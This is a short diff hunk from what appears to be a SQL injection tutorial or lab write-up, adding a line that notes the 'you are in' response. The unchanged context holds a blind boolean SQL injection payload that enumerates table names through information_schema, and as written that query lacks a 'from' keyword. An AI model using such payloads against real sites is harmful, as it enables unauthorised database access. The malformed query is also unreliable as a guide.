@@ -297,6 +297,8 @@ Now we start to enumerate the database. The query is
 
 **id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) < 105 –+**
 
+and we see a message you are in.......
+
 
 
 
